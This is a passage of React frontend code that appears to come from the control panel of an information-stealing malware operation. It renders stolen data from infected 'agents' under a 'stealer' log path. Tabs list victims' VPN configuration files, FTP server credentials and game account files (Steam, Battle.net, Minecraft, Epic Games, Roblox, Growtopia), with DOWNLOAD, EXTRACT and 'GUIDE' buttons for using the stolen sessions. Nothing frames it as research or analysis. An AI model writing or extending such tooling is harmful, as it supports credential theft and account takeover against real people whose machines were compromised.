                            const name = v.split('/').pop();
                            let label = "VPN Config";
                            if (name.includes("Proton")) label = "ProtonVPN";
                            if (name.includes("OpenVPN")) label = "OpenVPN";
                            if (name.includes("Nord")) label = "NordVPN";
                            return (
                                <div key={i} className="bg-[#111] border border-teal-500/20 rounded-xl p-5 flex flex-col items-center gap-3 hover:bg-[#1a1a1a] transition-all cursor-pointer group shadow-lg" onClick={() => window.open(`${API_BASE_URL}/logs/${agentId.replace(/:/g, '_')}/stealer/${v}`)}>
                                    <Lock size={32} className="text-teal-500 group-hover:scale-110 transition-transform"/>
                                    <div className="text-center"><div className="font-black text-white text-[10px] uppercase tracking-wider">{label}</div><div className="text-[9px] text-gray-500 font-mono mt-1 truncate max-w-[150px]">{name}</div></div>
                                    <button className="mt-2 w-full py-1.5 bg-[#222] text-[9px] font-bold rounded text-gray-400 group-hover:bg-teal-900/30 group-hover:text-teal-400 transition-colors">DOWNLOAD</button>
                                </div>
                            );
                        })}
                    </div>
                )}

                {/* FTP */}
                {activeTab === 'ftp' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                        {ftpData.map((f, i) => {
                            const name = f.split('/').pop();
                            return (
                                <div key={i} className="bg-[#111] border border-indigo-500/20 rounded-xl p-5 flex flex-col items-center gap-3 hover:bg-[#1a1a1a] transition-all cursor-pointer group shadow-lg" onClick={() => window.open(`${API_BASE_URL}/logs/${agentId.replace(/:/g, '_')}/stealer/${f}`)}>
                                    <Server size={32} className="text-indigo-500 group-hover:scale-110 transition-transform"/>
                                    <div className="text-center"><div className="font-black text-white text-[10px] uppercase tracking-wider">FTP Server</div><div className="text-[9px] text-gray-500 font-mono mt-1 truncate max-w-[150px]">{name}</div></div>
                                    <button className="mt-2 w-full py-1.5 bg-[#222] text-[9px] font-bold rounded text-gray-400 group-hover:bg-indigo-900/30 group-hover:text-indigo-400 transition-colors">VIEW XML</button>
                                </div>
                            );
                        })}
                    </div>
                )}

                {/* Games */}
                {activeTab === 'games' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                        {gamesData.map((g, i) => {
                            const name = g.split('/').pop();
                            let icon = <Gamepad size={32} className="text-pink-500"/>;
                            let label = "Game Data";
                            let guideKey = "Default";
                            
                            if (name.toLowerCase().includes("steam")) { label = "Steam"; icon = <Gamepad size={32} className="text-blue-500"/>; guideKey = "Steam"; }
                            else if (name.toLowerCase().includes("battle")) { label = "Battle.net"; icon = <Globe size={32} className="text-cyan-500"/>; guideKey = "Battle.net"; }
                            else if (name.toLowerCase().includes("minecraft")) { label = "Minecraft"; icon = <Box size={32} className="text-green-500"/>; guideKey = "Minecraft"; }
                            else if (name.toLowerCase().includes("epic")) { label = "Epic Games"; icon = <Gamepad size={32} className="text-white"/>; guideKey = "Epic Games"; }
                            else if (name.toLowerCase().includes("uplay")) { label = "Uplay"; icon = <Gamepad size={32} className="text-blue-400"/>; guideKey = "Default"; }
                            else if (name.toLowerCase().includes("roblox")) { label = "Roblox"; icon = <Gamepad size={32} className="text-red-500"/>; guideKey = "Default"; }
                            else if (name.toLowerCase().includes("growtopia")) { label = "Growtopia"; icon = <Gamepad size={32} className="text-yellow-500"/>; guideKey = "Default"; }

                            return (
                                <div key={i} className="bg-[#111] border border-[#333] rounded-xl p-5 flex flex-col items-center gap-3 hover:bg-[#1a1a1a] transition-all group shadow-lg">
                                    {icon}
                                    <div className="text-center"><div className="font-black text-white text-[10px] uppercase tracking-wider">{label}</div><div className="text-[9px] text-gray-500 font-mono mt-1 truncate max-w-[150px]">{name}</div></div>
                                    <div className="flex gap-2 w-full mt-2">
                                        <button onClick={() => window.open(`${API_BASE_URL}/logs/${agentId.replace(/:/g, '_')}/stealer/${g}`)} className="flex-1 py-1 bg-[#222] text-[9px] font-bold rounded text-gray-400 hover:text-white transition-colors">EXTRACT</button>
                                        <button onClick={() => setActiveInstruction(gameInstructions[guideKey])} className="flex-1 py-1 bg-red-900/30 text-[9px] font-bold rounded text-red-400 hover:bg-red-900/50 flex items-center justify-center gap-1"><HelpCircle size={10}/> GUIDE</button>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                )}
            </div>
        </div>
    );
}